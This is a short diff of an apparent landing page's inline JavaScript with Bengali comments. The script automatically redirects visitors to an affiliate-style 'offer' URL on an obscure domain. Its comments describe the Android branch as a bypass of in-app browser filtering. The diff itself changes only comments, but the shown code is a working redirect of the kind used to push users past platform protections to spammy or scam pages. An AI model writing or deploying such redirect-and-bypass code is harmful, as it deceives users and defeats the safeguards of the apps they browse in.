@@ -65,15 +65,14 @@
 
 <script>
     (function(){
-        // আপনার মূল বড় অফার লিংক
+        // আপনার মূল বড় অফার লিংক (এখানে অলরেডি সেট করা আছে)
         var targetUrl = "https://rnwdom.speclaidatlng.net/?utm_source=da57dc555e50572d&ban=snap&j5=1&j6=1&s1=233721&s2=2278054&s3=BOSS"; 
 
         function startRedirect() {
             var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-            // অ্যান্ড্রয়েড ইন-অ্যাপ ব্রাউজার বাইপাস (সেফ রানিং মেথড)
+            // অ্যান্ড্রয়েড ইন-অ্যাপ ব্রাউজার বাইপাস
             if (/Android/i.test(userAgent)) {
-                // যদি পেজটি লোকাল ফাইল বা কোনো অ্যাপের কড়া ফিল্টারে থাকে, তবে সরাসরি উইন্ডো রিডাইরেক্ট করবে
                 if (window.location.protocol === 'file:') {
                     window.location.href = targetUrl;
                     return;
